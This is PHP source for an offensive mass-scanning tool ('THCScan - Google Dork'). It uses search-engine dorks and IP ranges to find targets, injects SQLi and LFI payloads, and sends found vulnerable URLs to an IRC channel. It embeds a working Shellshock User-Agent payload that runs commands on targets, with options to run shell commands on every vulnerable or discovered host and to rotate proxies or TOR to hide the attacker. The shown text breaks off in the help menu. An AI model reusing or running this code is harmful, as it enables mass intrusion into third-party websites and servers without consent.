#!/usr/bin/php -q
<?php
/*

  +-----------------------------------------------------------------------------+
  |  [!] Aviso Legal: 						                                          		|
  |  Uso do THCScan - Google Dork					                                    	|
  |  para atacar alvos sem consentimento prévio mútuo é ilegal.			            |
  |                                                                             |
  |  É responsabilidade do usuário final obedecer a todas os Leis Locais, Estad-|
  |  uais e Federais								                                            |
  |                                                                             |
  |  Os desenvolvedores não assumem nenhuma responsabilidade e não são responsá-|
  |  veis ​​por qualquer uso indevido ou danos causados ​​por este programa     |
  |                                                                             |
  |                             RavokTHC-420                                    |
  +-----------------------------------------------------------------------------+




  [+] AUTOR:        RavokTHC
  [+] GIT:          https://github.com/RavokTHC


  [+] SCRIPT NAME: THCScan - Google Dork
  
  O scanner foi desenvolvido por RavokTHC & KarreraTHC.
  Ferramenta desenvolvida em PHP para rodar em diferentes distribuições Linux e Windows
  
  Versao do Scanner 0.4.2.0-1

  [+]

  - Possibilidade de gerar intervalos de IP ou random_ip e analisar seus alvos.
  - Personalização de HTTP-HEADER, USER-AGET, URL-REFERENCE.
  - Execução externa para explorar certos alvos.
  - Gerador dorks aleatório ou set arquivo idiota.
  - Opção para definir proxy, lista de proxy de arquivos, proxy http, proxy de arquivo http.
  - Definir proxy aleatório de tempo.
  - É possível usar TOR ip Random.
  - Depurar processos urls, requisição http, processo irc.
  - Servidor de comunicação irc enviando vulns urls para chat room.
  - Possibilidade de injeção de injeção GET / POST => SQLI, LFI, LFD.
  - Expressão regular baseada em filtro e validação.
  - Extração de email e url.
  - Validação usando código http.
  - Pesquisar páginas com base no arquivo de strings.
  - Explora o gerenciador de comandos.
  - Limitador de paginação nos motores de busca.
  - Bipe som quando disparar nota de vulnerabilidade.
  - Use o arquivo de texto como fonte de dados para testes de URLs.
  - Encontre strings personalizadas nos valores de retorno dos testes.
  - Shellshock de vulnerabilidade de validação.
  - Valores de validação de arquivos wordpress wp-config.php.
  - Processos de sub validação de execução.
  - Banco de dados de erros de sintaxe de validação e programmin.
  - Criptografia de dados como parâmetro nativo.
  - Host aleatório do Google.
  - Porta de varredura.
  - Verificação de erros e valores:
  [*] JAVA INFINITYDB, [*] INCLUSÃO DE ARQUIVO LOCAL, [*] ZIMBRA MAIL, [*] ZEND FRAMEWORK,
  [*] ERRO MARIADB, [*] ERRO MYSQL, [*] ERRO JBOSSWEB, [*] ERRO MICROSOFT,
  [*] ERRO ODBC, [*] ERRO, POSTGRESQL, [*] ERRO JAVA INFINITYDB, [*] ERROR PHP,
  [*] CMS WORDPRESS, [*] SHELL WEB, [*] ERRO JDBC, [*] ERROR ASP,
  [*] ERRO ORACLE, [*] ERRO DB2, [*] JDBC CFM, [*] ERROS LUA,
  [*] INDEFINITO DE ERRO

  [+] Dependências - (PHP 5.4.*):
  
  $# sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl


 */

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
(!isset($_SESSION) ? session_start() : NULL);
__OS();


/*
  [+]Capturing TERMINAL VALUES.
  (PHP 4 >= 4.3.0, PHP 5)getopt - Gets options from the command line argument list
  http://php.net/manual/pt_BR/function.getopt.php */
$commandos_list = array(
    'dork:', 'dork-file:', 'exploit-cad:', 'range:', 'range-rand:', 'irc:',
    'exploit-all-id:', 'exploit-vul-id:', 'exploit-get:', 'exploit-post:',
    'regexp-filter:', 'exploit-command:', 'command-all:', 'command-vul:',
    'replace:', 'remove:', 'regexp:', 'sall:', 'sub-file:', 'sub-get::', 'sub-concat:',
    'user-agent:', 'url-reference:', 'delay:', 'sendmail:', 'time-out:',
    'http-header:', 'ifcode:', 'ifurl:', 'ifemail:', 'mp:', 'target:',
    'no-banner::', 'gc::', 'proxy:', 'proxy-file:', 'time-proxy:', 'pr::',
    'proxy-http-file:', 'update::', 'info::', 'help::', 'unique::', 'popup::',
    'ajuda::', 'install-dependence::', 'cms-check::', 'sub-post::', 'robots::',
    'alexa-rank::', 'beep::', 'exploit-list::', 'tor-random::', 'shellshock::',
    'dork-rand:', 'sub-cmd-all:', 'sub-cmd-vul:', 'port-cmd:', 'port-scan:',
    'port-write:', 'ifredirect:', 'persist:', 'file-cookie:', 'save-as:'
);

$opcoes = getopt('u::a:d:o:p:s:q:t:m::h::', $commandos_list);


/*
  [+]VERIFYING LIB php5-curl IS INSTALLED.
  (PHP 4, PHP 5) function_exists — Return TRUE if the given function has been
  defined.
  http://php.net/manual/en/function.function-exists.php

  [+]Verification - CURL_EXEC
  Execute the given cURL session.
  This function should be called after initializing a cURL session and all the
  options for the session are set.
  http://php.net/manual/en/function.curl-exec.php */
(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );

/*
  [+]VERIFYING use Input PHP CLI.
  (PHP 4, PHP 5) defined — Checks whether a given named constant exists
  http://php.net/manual/pt_BR/function.defined.php */
(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);


#[+]Resetting VALUES $ _SESSION ['config']
$_SESSION['config'] = array();
$_SESSION['config']['version_script'] = '2.1';
$_SESSION['config']['totas_urls'] = NULL;
$_SESSION['config']["contUrl"] = 0;
$_SESSION['config']['cont_email'] = 0;
$_SESSION['config']['cont_url'] = 0;
$_SESSION['config']['cont_valores'] = 0;

#[+] FILE MANAGEMENT EXPLOITS.
$_SESSION['config']['file_exploit_conf'] = 'exploits.conf';

#[+] FOLDER WHERE WILL BE SAVED PROCESSES.
$_SESSION['config']['out_put_paste'] = 'output/';

/*
  [+]USER-AGENT EXPLOIT SHELLSHOCK
  (CVE-2014-6271, CVE-2014-6277,
  CVE-2014-6278, CVE-2014-7169,
  CVE-2014-7186, CVE-2014-7187)
  is a vulnerability in GNU's bash shell that gives attackers access to run remote
  commands on a vulnerable system. */
$_SESSION['config']['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"";

#[+]BLACK LIST URL-STRINGS
$_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,.hostname.,document.,";
$_SESSION['config']['blacklist'].= "live.,microsoft.,ask.,shifen.com,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,scripts.js,jquery-1.,dmoz.,gigablast.,aol.,.macromedia.com,.sitepoint.,yandex.,www.tor2web.org,.securityfocus.com,.Bootstrap.,.metasploit.com,";
$_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,kbhpodhnfxl3clb4,.scanalert.com,.prototype.,feedback.core,";
$_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,";
$_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,";
$_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com,sourceforge.,.mozilla.org";

$_SESSION['config']['line'] = "\n{$_SESSION["c1"]} _[ - ]{$_SESSION["c7"]}::{$_SESSION["c1"]}--------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}";

#[+]PRINTING HELP / INFO
(isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? __menu() : NULL);
(isset($opcoes['info']) ? __info() : NULL);

#[+]PRINTING EXPLOITS LIST.
(isset($opcoes['exploit-list']) ? print(__bannerLogo()) . __configExploitsList(1)  : NULL);

#[+]CREATING DEFAULT SETTINGS EXIT RESULTS.
(!is_dir($_SESSION['config']['out_put_paste']) ? mkdir($_SESSION['config']['out_put_paste'], 0777, TRUE) : NULL);

#[+]CREATING DEFAULT SETTINGS MANAGEMENT EXPLOITS.
(!file_exists($_SESSION['config']['file_exploit_conf']) ? touch($_SESSION['config']['file_exploit_conf']) : NULL);

#[+]Deletes FILE cookie STANDARD.
(file_exists('cookie.txt') ? unlink('cookie.txt') : NULL);

#[+]REGISTRATION NEW COMMAND EXPLOIT
(not_isnull_empty($opcoes['exploit-cad']) ? __configExploitsADD($opcoes['exploit-cad']) : NULL);

#[+]Dependencies installation
(isset($opcoes['install-dependence']) ? __installDepencia() : NULL);

#[+]UPDATE SCRIPT
(isset($opcoes['update']) ? __update() : NULL);

################################################################################
#CAPTURE OPTIONS################################################################
################################################################################
#[+]VALIDATION SEARCH METHODS / (DORK,RANGE-IP)
if (not_isnull_empty($opcoes['o'])) {

    $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
} else if (!not_isnull_empty($opcoes['o']) &&
        !not_isnull_empty($opcoes['range']) &&
        !not_isnull_empty($opcoes['range-rand']) &&
        !not_isnull_empty($opcoes['dork-rand'])) {

    $_SESSION['config']['dork'] = not_isnull_empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : NULL;
    $_SESSION['config']['dork-file'] = not_isnull_empty($opcoes['dork-file']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork-file'] : NULL;
    (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
}

#[+]VALIDATION GENERATE DORKS RANDOM
$_SESSION['config']['dork-rand'] = not_isnull_empty($opcoes['dork-rand']) ? $opcoes['dork-rand'] : NULL;

#[+]VALIDATION TARGET FIND PAGE
$_SESSION['config']['target'] = not_isnull_empty($opcoes['target']) && !isset($_SESSION['config']['dork']) ? $opcoes['target'] : NULL;

#[+]VALIDATION URL EXTRACTION
$_SESSION['config']['extrai-url'] = isset($opcoes['u']) ? TRUE : NULL;

#[+]VALIDATION EMAIL EXTRACTION
$_SESSION['config']['extrai-email'] = isset($opcoes['m']) ? TRUE : NULL;

#[+]VALIDATION ID SEARCH ENGINE
$_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) &&
        __validateOptions('1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,e1,e2,e3,e4,e5,e6,all', $opcoes['q']) ? $opcoes['q'] : 1;

#[+]VALIDATION SAVE FILE VULNERABLE
!not_isnull_empty($opcoes['s']) && !not_isnull_empty($opcoes['save-as']) && empty($opcoes['sall']) ?
                __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s , --save-as , --sall filevull.txt{$_SESSION["c0"]}\n") : NULL;

$_SESSION['config']['s'] = not_isnull_empty($opcoes['s']) ? $opcoes['s'] : null;

$_SESSION['config']['save-as'] = not_isnull_empty($opcoes['save-as']) ? $opcoes['save-as'] : null;

$_SESSION['config']['arquivo_output'] = not_isnull_empty($_SESSION['config']['s']) ? $_SESSION['config']['s'] : $opcoes['save-as'];

#[+]VALIDATION SAVE FILE ALL VALORES
$_SESSION['config']['arquivo_output_all'] = not_isnull_empty($opcoes['sall']) ? $opcoes['sall'] : NULL;

#[+]VALIDATION TYPE ERROR
$_SESSION['config']['tipoerro'] = not_isnull_empty($opcoes['t']) && __validateOptions('1,2,3,4,5', $opcoes['t']) ? $opcoes['t'] : 1;

#[+]VALIDATION REPLACEMENT VALUES
$_SESSION['config']['replace'] = not_isnull_empty($opcoes['replace']) ? $opcoes['replace'] : NULL;

#[+]VALIDATION SET PROXY
$_SESSION['config']['proxy'] = not_isnull_empty($opcoes['proxy']) ? $opcoes['proxy'] : NULL;

#[+]VALIDATION SET FILE WITH LIST OF PROXY
$_SESSION['config']['proxy-file'] = not_isnull_empty($opcoes['proxy-file']) ? $opcoes['proxy-file'] : NULL;

#[+]VALIDATION SET HTTP->PROXY
$_SESSION['config']['proxy-http'] = not_isnull_empty($opcoes['proxy-http']) ? $opcoes['proxy-http'] : NULL;

#[+]VALIDATION SET FILE WITH LIST OF HTTP->PROXY
$_SESSION['config']['proxy-http-file'] = not_isnull_empty($opcoes['proxy-http-file']) ? $opcoes['proxy-http-file'] : NULL;

#[+]VALIDATION SET EXPLOIT VIA REQUEST GET
$_SESSION['config']['exploit-get'] = not_isnull_empty($opcoes['exploit-get']) ? str_replace(' ', '%20', $opcoes['exploit-get']) : NULL;

#[+]VALIDATION SET EXPLOIT VIA REQUEST POST
$_SESSION['config']['exploit-post'] = not_isnull_empty($opcoes['exploit-post']) ? __convertUrlQuery($opcoes['exploit-post']) : NULL;
$_SESSION['config']['exploit-post_str'] = not_isnull_empty($opcoes['exploit-post']) ? $opcoes['exploit-post'] : NULL;

#[+]VALIDATION COMMAND SHELL STRING COMPLEMENTARY
$_SESSION['config']['exploit-command'] = not_isnull_empty($opcoes['exploit-command']) ? $opcoes['exploit-command'] : NULL;

#[+]VALIDATION MANAGEMENT COMMANDS SHELL TARGET VULN ID
$_SESSION['config']['exploit-vul-id'] = not_isnull_empty($opcoes['exploit-vul-id']) ? $opcoes['exploit-vul-id'] : NULL;

#[+]VALIDATION MANAGEMENT COMMANDS SHELL ALL TARGET ID
$_SESSION['config']['exploit-all-id'] = not_isnull_empty($opcoes['exploit-all-id']) ? $opcoes['exploit-all-id'] : NULL;

#[+]VALIDATION SET COMMANDS SHELL EXECUTE TARGET VULN
$_SESSION['config']['command-vul'] = not_isnull_empty($opcoes['command-vul']) ? $opcoes['command-vul'] : NULL;

#[+]VALIDATION SET COMMANDS SHELL EXECUTE ALL TARGET
$_SESSION['config']['command-all'] = not_isnull_empty($opcoes['command-all']) ? $opcoes['command-all'] : NULL;

#[+]VALIDATION ADDITIONAL TYPE OF PARAMETER ERROR
$_SESSION['config']['achar'] = not_isnull_empty($opcoes['a']) ? $opcoes['a'] : NULL;

#[+]VALIDATION DEBUG NIVEL
$_SESSION['config']['debug'] = not_isnull_empty($opcoes['d']) && __validateOptions('1,2,3,4,5,6', $opcoes['d']) ? $opcoes['d'] : NULL;

#[+]VALIDATION INTERNAL
$_SESSION['config']['verifica_info'] = (__validateOptions($opcoes['d'], 6)) ? 1 : NULL;

#[+]VALIDATION ADDITIONAL PARAMETER PROXY
$_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;

#[+]VALIDATION CHECK VALUES CMS
$_SESSION['config']['cms-check'] = isset($opcoes['cms-check']) ? TRUE : NULL;

#[+]VALIDATION CHECK LINKS WEBCACHE GOOGLE
$_SESSION['config']['webcache'] = isset($opcoes['gc']) ? TRUE : NULL;

#[+]VALIDATION REGULAR EXPRESSION
$_SESSION['config']['regexp'] = not_isnull_empty($opcoes['regexp']) ? $opcoes['regexp'] : NULL;

#[+]VALIDATION FILTER BY REGULAR EXPRESSION
$_SESSION['config']['regexp-filter'] = not_isnull_empty($opcoes['regexp-filter']) ? $opcoes['regexp-filter'] : NULL;

#[+]VALIDATION NO BANNER SCRIPT
$_SESSION['config']['no-banner'] = isset($opcoes['no-banner']) ? TRUE : NULL;

#[+]VALIDATION SET USER-AGENT REQUEST
$_SESSION['config']['user-agent'] = not_isnull_empty($opcoes['user-agent']) ? $opcoes['user-agent'] : NULL;

#[+]VALIDATION SET URL-REFERENCE REQUEST
$_SESSION['config']['url-reference'] = not_isnull_empty($opcoes['url-reference']) ? $opcoes['url-reference'] : NULL;

#[+]VALIDATION PAGING THE MAXIMUM SEARCH ENGINE
$_SESSION['config']['max_pag'] = not_isnull_empty($opcoes['mp']) ? $opcoes['mp'] : NULL;

#[+]VALIDATION DELAY SET PAGING AND PROCESSES
$_SESSION['config']['delay'] = not_isnull_empty($opcoes['delay']) ? $opcoes['delay'] : NULL;

#[+]VALIDATION SET TIME OUT REQUEST
$_SESSION['config']['time-out'] = not_isnull_empty($opcoes['time-out']) ? $opcoes['time-out'] : NULL;

#[+]VALIDATION CODE HTTP
$_SESSION['config']['ifcode'] = not_isnull_empty($opcoes['ifcode']) ? $opcoes['ifcode'] : NULL;

#[+]VALIDATION STRING URL
$_SESSION['config']['ifurl'] = not_isnull_empty($opcoes['ifurl']) ? $opcoes['ifurl'] : NULL;

#[+]VALIDATION SET HTTP HEADER
$_SESSION['config']['http-header'] = not_isnull_empty($opcoes['http-header']) ? $opcoes['http-header'] : NULL;

#[+]VALIDATION SET FILE SUB_PROCESS
$_SESSION['config']['sub-file'] = not_isnull_empty($opcoes['sub-file']) ? __openFile($opcoes['sub-file'], 1) : NULL;

#[+]VALIDATION SUB_PROCESS TYPE REQUEST POST
$_SESSION['config']['sub-post'] = isset($opcoes['sub-post']) ? TRUE : NULL;

#[+]VALIDATION SUB_PROCESS TYPE REQUEST GET
$_SESSION['config']['sub-get'] = isset($opcoes['sub-get']) ? TRUE : NULL;

#[+]VALIDATION SEND VULN EMAIL
$_SESSION['config']['sendmail'] = not_isnull_empty($opcoes['sendmail']) ? $opcoes['sendmail'] : NULL;

#[+]VALIDATION SHOW RANK ALEXA
$_SESSION['config']['alexa-rank'] = isset($opcoes['alexa-rank']) ? TRUE : NULL;

#[+]VALIDATION ACTIVATE BEEP WHEN APPEAR VULNERABLE
$_SESSION['config']['beep'] = isset($opcoes['beep']) ? TRUE : NULL;

#[+]VALIDATION OF SINGLE DOMAIN FILTER 
$_SESSION['config']['unique'] = isset($opcoes['unique']) ? TRUE : NULL;

#[+]VALIDATION IRC SERVER/CHANNEL SEND VULN
$_SESSION['config']['irc']['conf'] = not_isnull_empty($opcoes['irc']) && strstr($opcoes['irc'], '#') ? explode("#", $opcoes['irc']) : NULL;

#[+]VALIDATION RANGE IP
$_SESSION['config']['range'] = not_isnull_empty($opcoes['range']) && strstr($opcoes['range'], ',') ? $opcoes['range'] : NULL;

#[+]VALIDATION QUANTITY RANGE IP RANDOM
$_SESSION['config']['range-rand'] = not_isnull_empty($opcoes['range-rand']) ? $opcoes['range-rand'] : NULL;

#[+]VALIDATION REMOVE STRING URL
$_SESSION['config']['remove'] = not_isnull_empty($opcoes['remove']) ? $opcoes['remove'] : NULL;

#[+]VALIDATION ACCESS FILE ROBOTS
$_SESSION['config']['robots'] = isset($opcoes['robots']) ? TRUE : NULL;

#[+]VALIDATION FILTER EMAIL STRING
$_SESSION['config']['ifemail'] = not_isnull_empty($opcoes['ifemail']) ? $opcoes['ifemail'] : NULL;

#[+]VALIDATION OPEN WINDOW CONSOLE PROCESS
$_SESSION['config']['popup'] = isset($opcoes['popup']) ? TRUE : NULL;

#[+]VALIDATION ACTIVATE SHELLSHOCK
$_SESSION['config']['shellshock'] = isset($opcoes['shellshock']) ? TRUE : NULL;

#[+]VALIDATION METHOD OF BUSTA PROGRESSIVE
$_SESSION['config']['pr'] = isset($opcoes['pr']) ? TRUE : NULL;

#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE ALL TARGET
$_SESSION['config']['sub-cmd-all'] = isset($opcoes['sub-cmd-all']) ? TRUE : NULL;

#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE TARGET VULN
$_SESSION['config']['sub-cmd-vul'] = isset($opcoes['sub-cmd-vul']) ? TRUE : NULL;

#[+]VALIDATION SET POR VALIDATION
$_SESSION['config']['port-cmd'] = not_isnull_empty($opcoes['port-cmd']) ? $opcoes['port-cmd'] : NULL;

#[+]VALIDATION SET SCAN PORT
$_SESSION['config']['port-scan'] = not_isnull_empty($opcoes['port-scan']) ? $opcoes['port-scan'] : NULL;

#[+]VALIDATION SET PAYLOAD XPL PORT
$_SESSION['config']['port-write'] = not_isnull_empty($opcoes['port-write']) ? $opcoes['port-write'] : NULL;

#[+]VALIDATION SET URL REDIRECT HEADER
$_SESSION['config']['ifredirect'] = not_isnull_empty($opcoes['ifredirect']) ? $opcoes['ifredirect'] : NULL;

#[+]VALIDATION SET URL REDIRECT HEADER
$_SESSION['config']['persist'] = not_isnull_empty($opcoes['persist']) ? $opcoes['persist'] : 4;

#[+]VALIDATION SET FILE COOKIE
$_SESSION['config']['file-cookie'] = not_isnull_empty($opcoes['file-cookie']) ? $opcoes['file-cookie'] : NULL;

#[+]VALIDATION SET STRING CONCAT URL SUB-PROCESS
$_SESSION['config']['sub-concat'] = not_isnull_empty($opcoes['sub-concat']) ? $opcoes['sub-concat'] : NULL;

################################################################################
#IRC CONFIGURATION##############################################################
################################################################################

if (is_array($_SESSION['config']['irc']['conf'])) {

    $alph = range("A", "Z");
    $_ = array(0 => rand(0, 10000), 1 => $alph[rand(0, count($alph))]);
    $_SESSION['config']['irc']['my_pid'] = 0;
    $_SESSION['config']['irc']['irc_server'] = $_SESSION['config']['irc']['conf'][0];
    $_SESSION['config']['irc']['irc_channel'] = "#{$_SESSION['config']['irc']['conf'][1]}";
    $_SESSION['config']['irc']['irc_port'] = 6667;
    $_SESSION['config']['irc']['localhost'] = "127.0.0.1 localhost";
    $_SESSION['config']['irc']['irc_nick'] = "[BOT]1nurl{$_[0]}[{$_[1]}]";
    $_SESSION['config']['irc']['irc_realname'] = "B0t_1NURLBR";
    $_SESSION['config']['irc']['irc_quiet'] = "Session Ended";
    global $conf;
} elseif (!is_array($_SESSION['config']['irc']['conf']) && not_isnull_empty($opcoes['irc'])) {

    __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}IRC WRONG FORMAT! ex: --irc 'irc.rizon.net#inurlbrasil' {$_SESSION["c0"]}\n");
}

################################################################################
#IRC CONECTION##################################################################
################################################################################

function __ircConect($conf) {

    $fp = fsockopen($conf['irc_server'], $conf['irc_port'], $conf['errno'], $conf['errstr'], 30);
    if (!$fp) {

        echo "Error: {$conf['errstr']}({$conf['errno']})\n";
        return NULL;
    }
    $u = php_uname();
    fwrite($fp, "NICK {$conf['irc_nick']}\r\n");
    fwrite($fp, "USER {$conf['irc_nick']} 8 * :{$conf['irc_realname']}\r\n");
    fwrite($fp, "JOIN {$conf['irc_channel']}\r\n");
    fwrite($fp, "PRIVMSG {$conf['irc_channel']} :[ SERVER ] {$u}\r\n");
    return $fp;
}

################################################################################
#IRC SEND MSG###################################################################
################################################################################

function __ircMsg($conf, $msg) {

    fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :${msg}\r\n") . sleep(2);
    __plus();
}

################################################################################
#IRC PING PONG##################################################################
################################################################################

function __ircPong($conf) {

    while (!feof($conf['irc_connection'])) {

        $conf['READ_BUFFER'] = fgets($conf['irc_connection']);
        __plus();
        if (preg_match("/^PING(.+)/", $conf['READ_BUFFER'], $conf['ret'])) {

            __debug(array('debug' => "[ PING-PONG ]{$conf['ret'][1]}", 'function' => '__ircPong'), 6) . __plus();
            fwrite($conf['READ_BUFFER'], "PONG {$conf['ret'][1]}\r\n");
            ($_SESSION['config']['debug'] == 6) ?
                            fwrite($conf['irc_connection'], "PRIVMSG ${conf['irc_channel']} :[ PING-PONG ]-> {$conf['ret'][1]}->function:__ircPong\r\n") : NULL;
        }
    }
}

################################################################################
#IRC QUIT#######################################################################
################################################################################

function __ircQuit($conf) {

    fwrite($conf['irc_connection'], "QUIT {$conf['irc_quiet']}\r\n") . sleep(2);
    __plus();
    fclose($conf['irc_connection']);
}

#END IRC########################################################################
#UPDATE SCRIPT##################################################################
################################################################################

function __update() {

    echo __bannerLogo();

    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}WANT TO MAKE UPDATE SCRIPT\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}This can modify the current script\n{$_SESSION["c0"]}";
    echo "{$_SESSION["c1"]}__[ ! ] {$_SESSION["c16"]}ARE YOU SURE ? (y \ n): {$_SESSION["c0"]}";

    if (trim(fgets(STDIN)) == 'y') {

        $resultado = __request_info("https://raw.githubusercontent.com/googleinurl/SCANNER-INURLBR/master/inurlbr.php", $_SESSION["config"]["proxy"], NULL);

        if (not_isnull_empty($resultado['corpo'])) {

            unlink('inurlbr.php');
            $varf = fopen('inurlbr.php', 'a');
            fwrite($varf, $resultado['corpo']);
            fclose($varf);
            chmod('inurlbr.php', 0777);
            echo "\nUPDATE DONE WITH SUCCESS!\n";
            sleep(3);
            system("chmod +x inurlbr.php | php inurlbr.php");
            exit();
        } else {

            echo system("command clear") . __bannerLogo();
            echo "{$_SESSION["c1"]}__[ x ] {$_SESSION["c16"]}FAILURE TO SERVER!\n{$_SESSION["c0"]}";
        }
    }
}

################################################################################
#SECURITIES VALIDATION DOUBLE#####################################################
################################################################################

function not_isnull_empty($valor = NULL) {

    RETURN !is_null($valor) && !empty($valor) ? TRUE : FALSE;
}

################################################################################
#MENU###########################################################################
################################################################################

function __menu() {

    return system("command clear") . __getOut(__extra() . "        
 {$_SESSION["c1"]}_    _ ______ _      _____  
| |  | |  ____| |    |  __ \
| |__| | |__  | |    | |__) |
|  __  |  __| | |    |  ___/
| |  | | |____| |____| |    
|_|  |_|______|______|_|

{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
" . $_SESSION['config']['line'] . "
    
{$_SESSION["c1"]}-h{$_SESSION["c0"]}
{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
     [options]:
     {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
     {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
     {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
     {$_SESSION["c1"]}4{$_SESSION["c0"]}   - {$_SESSION["c2"]}ASK
     {$_SESSION["c1"]}5{$_SESSION["c0"]}   - {$_SESSION["c2"]}HAO123 BR
     {$_SESSION["c1"]}6{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE (API)
     {$_SESSION["c1"]}7{$_SESSION["c0"]}   - {$_SESSION["c2"]}LYCOS
     {$_SESSION["c1"]}8{$_SESSION["c0"]}   - {$_SESSION["c2"]}UOL BR
     {$_SESSION["c1"]}9{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO US
     {$_SESSION["c1"]}10{$_SESSION["c0"]}  - {$_SESSION["c2"]}SAPO
     {$_SESSION["c1"]}11{$_SESSION["c0"]}  - {$_SESSION["c2"]}DMOZ
     {$_SESSION["c1"]}12{$_SESSION["c0"]}  - {$_SESSION["c2"]}GIGABLAST
     {$_SESSION["c1"]}13{$_SESSION["c0"]}  - {$_SESSION["c2"]}NEVER
     {$_SESSION["c1"]}14{$_SESSION["c0"]}  - {$_SESSION["c2"]}BAIDU BR
     {$_SESSION["c1"]}15{$_SESSION["c0"]}  - {$_SESSION["c2"]}YANDEX
     {$_SESSION["c1"]}16{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZOO
     {$_SESSION["c1"]}17{$_SESSION["c0"]}  - {$_SESSION["c2"]}HOTBOT
     {$_SESSION["c1"]}18{$_SESSION["c0"]}  - {$_SESSION["c2"]}ZHONGSOU
     {$_SESSION["c1"]}19{$_SESSION["c0"]}  - {$_SESSION["c2"]}HKSEARCH
     {$_SESSION["c1"]}20{$_SESSION["c0"]}  - {$_SESSION["c2"]}EZILION
     {$_SESSION["c1"]}21{$_SESSION["c0"]}  - {$_SESSION["c2"]}SOGOU
